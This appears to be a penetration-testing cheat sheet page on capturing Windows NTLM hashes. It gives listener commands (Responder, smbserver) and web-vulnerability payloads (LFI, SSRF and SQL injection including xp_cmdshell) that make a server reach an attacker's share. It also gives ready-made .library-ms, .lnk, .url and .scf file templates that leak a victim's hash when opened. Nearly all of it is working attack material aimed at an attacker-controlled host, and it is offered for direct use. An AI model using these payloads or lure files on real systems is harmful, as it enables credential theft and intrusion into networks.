---
icon: ear
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: false
---

# Capturing NTLM

## Listener

```sh
sudo responder -I <interface>
```

```sh
smbserver.py share /dev/null -smb2support
```

## Possible Attacks

### Via web vulnerability

If you discover a web vulnerability (such as LFI, SQLI, XXE, SSRF, SSTI) that allows you to include remote files, you can exploit it to steal the NTLM hash of the user running the process. For example:

```sh
# LFI
?page=\\<attaker>\shared

# SSRF
?url=file:////<attaker>/shared

# SQL Injection
?id=1' union select null,load_file('\\\\<attaker>\\shared'),null-- -
?id=1' union select null,(select x from OpenRowset(BULK '\\<attaker>\shared',SINGLE_CLOB) R(x)),null-- -
?id=1' union select null,(EXEC xp_cmdshell 'dir \\<attaker>\shared'),null-- -
```

### Via .library-ms file

```sh
cat > \!shared.library-ms <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\<attacker>\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF
```

### Via .lnk file

```sh
pylnk3 c '\\<attacker>\shared' \!shared.lnk -i '\\<attacker>\shared\icon.ico'
```

### Via .url file

```sh
cat > \!shared.url <<EOF
[InternetShortcut]
URL=\\\\<attacker>\\shared
IconIndex=1
IconFile=\\\\<attacker>\\shared\\icon.ico
EOF
```

### Via .scf file

```sh
cat > \!shared.scf <<EOF
[Shell]
Command=2
IconFile=\\\\<attacker>\\shared\\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF
```
